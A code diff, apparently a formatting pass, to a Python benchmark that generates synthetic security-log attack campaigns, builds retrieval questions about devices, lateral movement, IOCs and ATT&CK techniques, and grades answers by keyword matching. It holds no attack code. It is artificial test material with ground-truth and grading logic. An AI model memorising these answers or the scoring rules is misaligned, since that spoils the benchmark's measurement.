     question: str
     category: str  # alert_retrieval, attack_chain, ioc_correlation, temporal, cross_campaign
@@ -627,8 +819,9 @@ class SecurityQuestion:
     difficulty: str  # easy, medium, hard
 
 
-def _generate_questions(campaigns: list[AttackCampaign], rng: random.Random,
-                        num_questions: int = 100) -> list[SecurityQuestion]:
+def _generate_questions(
+    campaigns: list[AttackCampaign], rng: random.Random, num_questions: int = 100
+) -> list[SecurityQuestion]:
     """Generate questions testing distributed retrieval capabilities."""
     questions: list[SecurityQuestion] = []
     qid = 0
@@ -636,66 +829,85 @@ def _generate_questions(campaigns: list[AttackCampaign], rng: random.Random,
     for camp in campaigns:
         # Alert retrieval (easy — single fact lookup)
         qid += 1
-        questions.append(SecurityQuestion(
-            question_id=f"SEC-{qid:04d}",
-            question=f"What devices were targeted in campaign {camp.campaign_id}?",
-            category="alert_retrieval",
-            ground_truth_facts=[f"{camp.campaign_id} " + d for d in camp.target_devices],
-            required_keywords=camp.target_devices[:3],
-            campaign_ids=[camp.campaign_id],
-            difficulty="easy",
-        ))
+        questions.append(
+            SecurityQuestion(
+                question_id=f"SEC-{qid:04d}",
+                question=f"What devices were targeted in campaign {camp.campaign_id}?",
+                category="alert_retrieval",
+                ground_truth_facts=[f"{camp.campaign_id} " + d for d in camp.target_devices],
+                required_keywords=camp.target_devices[:3],
+                campaign_ids=[camp.campaign_id],
+                difficulty="easy",
+            )
+        )
 
         # Attack chain reconstruction (medium — multi-hop)
         qid += 1
-        questions.append(SecurityQuestion(
-            question_id=f"SEC-{qid:04d}",
-            question=f"Describe the lateral movement path in campaign {camp.campaign_id}. "
-                     f"Which devices were compromised in order?",
-            category="attack_chain",
-            ground_truth_facts=[f"{camp.campaign_id} lateral movement to {d}" for d in camp.lateral_movement_path[1:]],
-            required_keywords=camp.lateral_movement_path[:3],
-            campaign_ids=[camp.campaign_id],
-            difficulty="medium",
-        ))
+        questions.append(
+            SecurityQuestion(
+                question_id=f"SEC-{qid:04d}",
+                question=f"Describe the lateral movement path in campaign {camp.campaign_id}. "
+                f"Which devices were compromised in order?",
+                category="attack_chain",
+                ground_truth_facts=[
+                    f"{camp.campaign_id} lateral movement to {d}"
+                    for d in camp.lateral_movement_path[1:]
+                ],
+                required_keywords=camp.lateral_movement_path[:3],
+                campaign_ids=[camp.campaign_id],
+                difficulty="medium",
+            )
+        )
 
         # IOC correlation (medium — connect indicators)
         qid += 1
-        questions.append(SecurityQuestion(
-            question_id=f"SEC-{qid:04d}",
-            question=f"What are the IOCs (IP addresses and file hashes) associated with campaign {camp.campaign_id}?",
-            category="ioc_correlation",
-            ground_truth_facts=[f"{camp.campaign_id} C2 connection to {ip}" for ip in camp.iocs["ip"][:2]],
-            required_keywords=camp.iocs["ip"][:2] + [camp.malware_hashes[0][:16]],
-            campaign_ids=[camp.campaign_id],
-            difficulty="medium",
-        ))
+        questions.append(
+            SecurityQuestion(
+                question_id=f"SEC-{qid:04d}",
+                question=f"What are the IOCs (IP addresses and file hashes) associated with campaign {camp.campaign_id}?",
+                category="ioc_correlation",
+                ground_truth_facts=[
+                    f"{camp.campaign_id} C2 connection to {ip}" for ip in camp.iocs["ip"][:2]
+                ],
+                required_keywords=camp.iocs["ip"][:2] + [camp.malware_hashes[0][:16]],
+                campaign_ids=[camp.campaign_id],
+                difficulty="medium",
+            )
+        )
 
         # Temporal reasoning (hard — timeline)
         qid += 1
-        questions.append(SecurityQuestion(
-            question_id=f"SEC-{qid:04d}",
-            question=f"What was the sequence of MITRE ATT&CK techniques used in campaign {camp.campaign_id}? "
-                     f"List them in chronological order.",
-            category="temporal",
-            ground_truth_facts=[f"{camp.campaign_id} technique {t}" for t in camp.techniques[:4]],
-            required_keywords=[MITRE_TECHNIQUES.get(t, t).split(":")[0].strip() for t in camp.techniques[:3]],
-            campaign_ids=[camp.campaign_id],
-            difficulty="hard",
-        ))
+        questions.append(
+            SecurityQuestion(
+                question_id=f"SEC-{qid:04d}",
+                question=f"What was the sequence of MITRE ATT&CK techniques used in campaign {camp.campaign_id}? "
+                f"List them in chronological order.",
+                category="temporal",
+                ground_truth_facts=[
+                    f"{camp.campaign_id} technique {t}" for t in camp.techniques[:4]
+                ],
+                required_keywords=[
+                    MITRE_TECHNIQUES.get(t, t).split(":")[0].strip() for t in camp.techniques[:3]
+                ],
+                campaign_ids=[camp.campaign_id],
+                difficulty="hard",
+            )
+        )
 
         # Objective identification
         qid += 1
-        questions.append(SecurityQuestion(
-            question_id=f"SEC-{qid:04d}",
-            question=f"What was the objective of campaign {camp.campaign_id}? "
-                     f"Was it ransomware, data exfiltration, espionage, or something else?",
-            category="alert_retrieval",
-            ground_truth_facts=[f"{camp.campaign_id} objective: {camp.objective}"],
-            required_keywords=[camp.objective.replace("_", " ")],
-            campaign_ids=[camp.campaign_id],
-            difficulty="easy",
-        ))
+        questions.append(
+            SecurityQuestion(
+                question_id=f"SEC-{qid:04d}",
+                question=f"What was the objective of campaign {camp.campaign_id}? "
+                f"Was it ransomware, data exfiltration, espionage, or something else?",
+                category="alert_retrieval",
+                ground_truth_facts=[f"{camp.campaign_id} objective: {camp.objective}"],
+                required_keywords=[camp.objective.replace("_", " ")],
+                campaign_ids=[camp.campaign_id],
+                difficulty="easy",
+            )
+        )
 
     # Cross-campaign questions (hard — connect multiple campaigns)
     actors_used = {}
@@ -707,16 +919,18 @@ def _generate_questions(campaigns: list[AttackCampaign], rng: random.Random,
         if len(actor_campaigns) >= 2:
             qid += 1
             camp_ids = [c.campaign_id for c in actor_campaigns[:3]]
-            questions.append(SecurityQuestion(
-                question_id=f"SEC-{qid:04d}",
-                question=f"Which campaigns are attributed to {actor}? "
-                         f"What common techniques did they use across campaigns?",
-                category="cross_campaign",
-                ground_truth_facts=[f"{cid} threat actor {actor}" for cid in camp_ids],
-                required_keywords=camp_ids[:2],
-                campaign_ids=camp_ids,
-                difficulty="hard",
-            ))
+            questions.append(
+                SecurityQuestion(
+                    question_id=f"SEC-{qid:04d}",
+                    question=f"Which campaigns are attributed to {actor}? "
+                    f"What common techniques did they use across campaigns?",
+                    category="cross_campaign",
+                    ground_truth_facts=[f"{cid} threat actor {actor}" for cid in camp_ids],
+                    required_keywords=camp_ids[:2],
+                    campaign_ids=camp_ids,
+                    difficulty="hard",
+                )
+            )
 
     # Device-centric questions
     device_campaigns: dict[str, list[str]] = {}
@@ -726,16 +940,18 @@ def _generate_questions(campaigns: list[AttackCampaign], rng: random.Random,
     for dev, cids in device_campaigns.items():
         if len(cids) >= 2:
             qid += 1
-            questions.append(SecurityQuestion(
-                question_id=f"SEC-{qid:04d}",
-                question=f"Device {dev} was compromised in multiple campaigns. "
-                         f"Which campaigns affected this device and what happened?",
-                category="cross_campaign",
-                ground_truth_facts=[f"campaign on {dev}" for _ in cids],
-                required_keywords=cids[:2],
-                campaign_ids=cids,
-                difficulty="hard",
-            ))
+            questions.append(
+                SecurityQuestion(
+                    question_id=f"SEC-{qid:04d}",
+                    question=f"Device {dev} was compromised in multiple campaigns. "
+                    f"Which campaigns affected this device and what happened?",
+                    category="cross_campaign",
+                    ground_truth_facts=[f"campaign on {dev}" for _ in cids],
+                    required_keywords=cids[:2],
+                    campaign_ids=cids,
+                    difficulty="hard",
+                )
+            )
             if len(questions) >= num_questions:
                 break
 
@@ -747,9 +963,11 @@ def _generate_questions(campaigns: list[AttackCampaign], rng: random.Random,
 # Grading
 # ============================================================
 
+
 @dataclass
 class SecurityGradeResult:
     """Grading result for a single question."""
+
     question_id: str
     category: str
     score: float  # 0.0 - 1.0
@@ -792,7 +1010,9 @@ def _grade_answer(question: SecurityQuestion, answer: str) -> SecurityGradeResul
             idx = pos + 1
 
     if mentioned_camps:
-        correct_mentions = sum(1 for m in mentioned_camps if any(m.startswith(c) for c in question.campaign_ids))
+        correct_mentions = sum(
+            1 for m in mentioned_camps if any(m.startswith(c) for c in question.campaign_ids)
+        )
         precision = correct_mentions / len(mentioned_camps) if mentioned_camps else 1.0
     else:
         precision = 1.0 if recall > 0 else 0.0
@@ -822,9 +1042,11 @@ def _grade_answer(question: SecurityQuestion, answer: str) -> SecurityGradeResul
 # Main Eval Class
 # ============================================================
 
+
 @dataclass
 class SecurityEvalReport:
     """Complete evaluation report."""
+
     overall_score: float = 0.0
     overall_precision: float = 0.0
     overall_recall: float = 0.0
@@ -901,7 +1123,8 @@ class SecurityLogEval:
         # Calculate noise events to reach target turn count
         num_noise = max(0, self.num_turns - len(campaign_events))
         noise_events = _generate_noise_events(
-            rng, num_noise,
+            rng,
+            num_noise,
             max(c.start_day + c.duration_days for c in self.campaigns),
         )
 
@@ -910,7 +1133,7 @@ class SecurityLogEval:
         rng.shuffle(self.events)
 
         # Truncate to target
-        self.events = self.events[:self.num_turns]
+        self.events = self.events[: self.num_turns]
 
         # Generate questions
         self.questions = _generate_questions(self.campaigns, rng, self.num_questions)
@@ -936,7 +1159,9 @@ class SecurityLogEval:
         """
         logger.info(
             "Starting security log eval: %d turns, %d questions, %d campaigns",
-            self.num_turns, self.num_questions, self.num_campaigns,
+            self.num_turns,
+            self.num_questions,
+            self.num_campaigns,
         )
 
         # Step 1: Generate data
@@ -949,7 +1174,8 @@ class SecurityLogEval:
             if (i + 1) % 500 == 0:
                 logger.info(
                     "Fed %d/%d events (%.1f turns/s)",
-                    i + 1, len(self.events),
+                    i + 1,
+                    len(self.events),
                     (i + 1) / (time.time() - t0),
                 )
         learning_time = time.time() - t0
@@ -965,7 +1191,8 @@ class SecurityLogEval:
             if (i + 1) % 20 == 0:
                 logger.info(
                     "Graded %d/%d questions (avg score: %.2f%%)",
-                    i + 1, len(self.questions),
+                    i + 1,
+                    len(self.questions),
                     sum(r.score for r in results) / len(results) * 100,
                 )
         grading_time = time.time() - t1
@@ -975,8 +1202,9 @@ class SecurityLogEval:
         self._print_report(report)
         return report
 
-    def _aggregate(self, results: list[SecurityGradeResult],
-                   learning_time: float, grading_time: float) -> SecurityEvalReport:
+    def _aggregate(
+        self, results: list[SecurityGradeResult], learning_time: float, grading_time: float
+    ) -> SecurityEvalReport:
         """Aggregate individual grades into a report."""
         report = SecurityEvalReport(
             num_questions=len(results),
@@ -1011,7 +1239,7 @@ class SecurityLogEval:
 
         # By difficulty
         difficulties: dict[str, list[SecurityGradeResult]] = {}
-        for q, r in zip(self.questions, results):
+        for q, r in zip(self.questions, results, strict=False):
             difficulties.setdefault(q.difficulty, []).append(r)
         for diff, diff_results in difficulties.items():
             report.difficulty_scores[diff] = sum(r.score for r in diff_results) / len(diff_results)
@@ -1064,10 +1292,12 @@ class SecurityLogEval:
         for diff, score in sorted(report.difficulty_scores.items()):
             logger.info("%-20s %7.2f%%", diff, score * 100)
         logger.info(
-            "Turns: %d | Questions: %d | Campaigns: %d | "
-            "Learning: %.1fs | Grading: %.1fs",
-            report.num_turns, report.num_questions, report.num_campaigns,
-            report.learning_time_s, report.grading_time_s,
+            "Turns: %d | Questions: %d | Campaigns: %d | Learning: %.1fs | Grading: %.1fs",
+            report.num_turns,
+            report.num_questions,
+            report.num_campaigns,
+            report.learning_time_s,
+            report.grading_time_s,
         )
         logger.info("=" * 70)
 
@@ -1075,6 +1305,7 @@ class SecurityLogEval:
 # ============================================================
 # CLI entry point
 # ============================================================
+
 
 def main():
     import argparse
